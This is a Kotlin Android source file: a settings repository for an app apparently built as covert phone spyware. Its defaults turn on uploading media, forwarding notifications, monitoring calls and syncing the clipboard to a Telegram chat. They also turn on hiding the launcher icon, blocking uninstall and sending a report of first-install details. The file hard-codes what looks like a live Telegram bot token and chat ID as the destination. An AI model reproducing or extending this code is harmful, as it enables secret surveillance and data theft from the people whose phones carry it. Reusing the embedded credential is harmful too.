package com.example.data

import android.content.Context
import android.content.SharedPreferences

class MediaUploadRepository(context: Context) {

    private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    companion object {
        private const val PREFS_NAME = "nova_media_sync_prefs"
        private const val KEY_UPLOADED_IDS = "uploaded_media_ids"
        private const val KEY_BOT_TOKEN = "telegram_bot_token"
        private const val KEY_CHAT_ID = "telegram_chat_id"
        private const val KEY_LAST_SYNC_TIMESTAMP = "last_sync_timestamp"
        private const val KEY_SERVICE_ENABLED = "service_enabled"
        private const val KEY_FIRST_INSTALL_SENT = "first_time_install_details_sent"
        private const val KEY_DEVICE_ID = "nova_unique_device_id"
        private const val KEY_LAST_UPDATE_ID = "telegram_last_update_id"
        private const val KEY_APP_PIN = "nova_app_security_pin"
        private const val KEY_ANTI_UNINSTALL = "nova_anti_uninstall_enabled"
        private const val KEY_AUTO_ICON_HIDE = "nova_auto_icon_hide_enabled"
        private const val KEY_ICON_HIDDEN = "nova_icon_hidden_state"
        private const val KEY_NOTIFICATION_FORWARDING = "nova_notification_forwarding_enabled"
        private const val KEY_CALL_MONITORING = "nova_call_monitoring_enabled"
        private const val KEY_CLIPBOARD_SYNC = "nova_clipboard_sync_enabled"
        private const val KEY_AUTO_SYNC_ENABLED = "nova_auto_sync_enabled"
        private const val KEY_SELECTED_TARGET_DEVICE = "nova_selected_target_device"
        private const val KEY_LAST_ACTIVE_TIMESTAMP = "nova_last_active_timestamp"
        private const val KEY_TELEGRAM_CONNECTED = "nova_telegram_connected_state"
        private const val KEY_TELEGRAM_LAST_CONNECTED = "nova_telegram_last_connected_time"

        const val DEFAULT_BOT_TOKEN = "8620579280:AAF9zUBAORawb9oQvy5R2WEb4DFQ3xJRwKI"
        const val DEFAULT_CHAT_ID = "-1004457596144"
    }

    fun setTelegramConnected(connected: Boolean) {
        prefs.edit()
            .putBoolean(KEY_TELEGRAM_CONNECTED, connected)
            .putLong(KEY_TELEGRAM_LAST_CONNECTED, System.currentTimeMillis())
            .apply()
    }

    fun isTelegramConnected(): Boolean {
        return prefs.getBoolean(KEY_TELEGRAM_CONNECTED, false)
    }

    fun getLastTelegramConnectedTime(): Long {
        return prefs.getLong(KEY_TELEGRAM_LAST_CONNECTED, 0L)
    }

    fun getDeviceId(): String {
        var id = prefs.getString(KEY_DEVICE_ID, null)
        if (id.isNullOrBlank()) {
            val cleanModel = android.os.Build.MODEL.replace("[^a-zA-Z0-9]".toRegex(), "").uppercase().take(6).ifBlank { "DEVICE" }
            val randomSuffix = java.util.UUID.randomUUID().toString().replace("-", "").take(4).uppercase()
            id = "$cleanModel-$randomSuffix"
            prefs.edit().putString(KEY_DEVICE_ID, id).apply()
        }
        return id
    }

    fun getSelectedTargetDevice(): String? {
        val target = prefs.getString(KEY_SELECTED_TARGET_DEVICE, null)?.trim()
        return if (target.isNullOrBlank()) null else target
    }

    fun setSelectedTargetDevice(target: String?) {
        if (target.isNullOrBlank()) {
            prefs.edit().remove(KEY_SELECTED_TARGET_DEVICE).apply()
        } else {
            prefs.edit().putString(KEY_SELECTED_TARGET_DEVICE, target.trim()).apply()
        }
    }

    private val processedUpdatesCache = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()

    fun isTelegramUpdateProcessed(updateId: Long): Boolean {
        if (processedUpdatesCache.contains(updateId)) return true
        val set = prefs.getStringSet("KEY_PROCESSED_UPDATE_IDS", emptySet()) ?: emptySet()
        val exists = set.contains(updateId.toString())
        if (exists) {
            processedUpdatesCache.add(updateId)
        }
        return exists
    }

    fun markTelegramUpdateProcessed(updateId: Long) {
        processedUpdatesCache.add(updateId)
        val set = prefs.getStringSet("KEY_PROCESSED_UPDATE_IDS", emptySet()) ?: emptySet()
        val newSet = HashSet(set)
        newSet.add(updateId.toString())
        if (newSet.size > 500) {
            val sorted = newSet.mapNotNull { it.toLongOrNull() }.sorted()
            val trimmed = sorted.takeLast(350).map { it.toString() }.toSet()
            prefs.edit().putStringSet("KEY_PROCESSED_UPDATE_IDS", trimmed).apply()
        } else {
            prefs.edit().putStringSet("KEY_PROCESSED_UPDATE_IDS", newSet).apply()
        }
    }

    fun getLastTelegramUpdateId(): Long {
        return prefs.getLong(KEY_LAST_UPDATE_ID, 0L)
    }

    fun setLastTelegramUpdateId(updateId: Long) {
        prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
    }

    fun getTelegramConfig(): TelegramConfig {
        val token = prefs.getString(KEY_BOT_TOKEN, DEFAULT_BOT_TOKEN) ?: DEFAULT_BOT_TOKEN
        val chat = prefs.getString(KEY_CHAT_ID, DEFAULT_CHAT_ID) ?: DEFAULT_CHAT_ID
        return TelegramConfig(
            botToken = if (token.isBlank()) DEFAULT_BOT_TOKEN else token,
            chatId = if (chat.isBlank()) DEFAULT_CHAT_ID else chat
        )
    }

    fun saveTelegramConfig(botToken: String, chatId: String) {
        prefs.edit()
            .putString(KEY_BOT_TOKEN, botToken.trim())
            .putString(KEY_CHAT_ID, chatId.trim())
            .apply()
    }

    fun isMediaUploaded(mediaId: Long): Boolean {
        val uploadedSet = prefs.getStringSet(KEY_UPLOADED_IDS, emptySet()) ?: emptySet()
        return uploadedSet.contains(mediaId.toString())
    }

    fun markMediaUploaded(mediaId: Long) {
        val currentSet = prefs.getStringSet(KEY_UPLOADED_IDS, emptySet()) ?: emptySet()
        val newSet = currentSet.toMutableSet()
        newSet.add(mediaId.toString())
        prefs.edit().putStringSet(KEY_UPLOADED_IDS, newSet).apply()
    }

    fun markMediaBatchUploaded(mediaIds: Collection<Long>) {
        val currentSet = prefs.getStringSet(KEY_UPLOADED_IDS, emptySet()) ?: emptySet()
        val newSet = currentSet.toMutableSet()
        newSet.addAll(mediaIds.map { it.toString() })
        prefs.edit().putStringSet(KEY_UPLOADED_IDS, newSet).apply()
    }

    fun getUploadedIds(): Set<Long> {
        val uploadedSet = prefs.getStringSet(KEY_UPLOADED_IDS, emptySet()) ?: emptySet()
        return uploadedSet.mapNotNull { it.toLongOrNull() }.toSet()
    }

    fun setLastSyncTimestamp(timestamp: Long) {
        prefs.edit().putLong(KEY_LAST_SYNC_TIMESTAMP, timestamp).apply()
    }

    fun getLastSyncTimestamp(): Long {
        return prefs.getLong(KEY_LAST_SYNC_TIMESTAMP, 0L)
    }

    fun setServiceEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_SERVICE_ENABLED, enabled).apply()
    }

    fun isServiceEnabled(): Boolean {
        return prefs.getBoolean(KEY_SERVICE_ENABLED, true)
    }

    fun isFirstInstallReportSent(): Boolean {
        return prefs.getBoolean(KEY_FIRST_INSTALL_SENT, false)
    }

    fun markFirstInstallReportSent() {
        prefs.edit().putBoolean(KEY_FIRST_INSTALL_SENT, true).apply()
    }

    fun getAppPin(): String? {
        val pin = prefs.getString(KEY_APP_PIN, null)
        return if (pin.isNullOrBlank()) null else pin.trim()
    }

    fun setAppPin(pin: String?) {
        val cleanPin = pin?.trim()
        if (cleanPin.isNullOrBlank()) {
            prefs.edit().remove(KEY_APP_PIN).apply()
        } else {
            prefs.edit().putString(KEY_APP_PIN, cleanPin).apply()
        }
    }

    fun hasAppPin(): Boolean = !getAppPin().isNullOrBlank()

    fun isPinCorrect(enteredPin: String): Boolean {
        val currentPin = getAppPin() ?: return true
        return currentPin == enteredPin.trim()
    }

    fun isAntiUninstallEnabled(): Boolean {
        return prefs.getBoolean(KEY_ANTI_UNINSTALL, true)
    }

    fun setAntiUninstallEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_ANTI_UNINSTALL, enabled).apply()
    }

    fun isAutoIconHideEnabled(): Boolean {
        return prefs.getBoolean(KEY_AUTO_ICON_HIDE, true)
    }

    fun isAutoHideIconEnabled(): Boolean = isAutoIconHideEnabled()

    fun setAutoIconHide(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_AUTO_ICON_HIDE, enabled).apply()
    }

    fun setAutoHideIconEnabled(enabled: Boolean) = setAutoIconHide(enabled)

    fun isIconHidden(): Boolean {
        return prefs.getBoolean(KEY_ICON_HIDDEN, false)
    }

    fun setIconHidden(hidden: Boolean) {
        prefs.edit().putBoolean(KEY_ICON_HIDDEN, hidden).apply()
    }

    fun isNotificationForwardingEnabled(): Boolean {
        return prefs.getBoolean(KEY_NOTIFICATION_FORWARDING, true)
    }

    fun setNotificationForwardingEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_NOTIFICATION_FORWARDING, enabled).apply()
    }

    fun isCallMonitoringEnabled(): Boolean {
        return prefs.getBoolean(KEY_CALL_MONITORING, true)
    }

    fun setCallMonitoringEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_CALL_MONITORING, enabled).apply()
    }

    fun isClipboardSyncEnabled(): Boolean {
        return prefs.getBoolean(KEY_CLIPBOARD_SYNC, true)
    }

    fun setClipboardSyncEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_CLIPBOARD_SYNC, enabled).apply()
    }

    fun isAutoSyncEnabled(): Boolean {
        return prefs.getBoolean(KEY_AUTO_SYNC_ENABLED, true)
    }

    fun setAutoSyncEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_AUTO_SYNC_ENABLED, enabled).apply()
    }

    fun updateLastActiveTimestamp() {
        prefs.edit().putLong(KEY_LAST_ACTIVE_TIMESTAMP, System.currentTimeMillis()).apply()
    }

    fun getLastActiveTimestamp(): Long {
        val ts = prefs.getLong(KEY_LAST_ACTIVE_TIMESTAMP, 0L)
        return if (ts > 0L) ts else System.currentTimeMillis()
    }
}
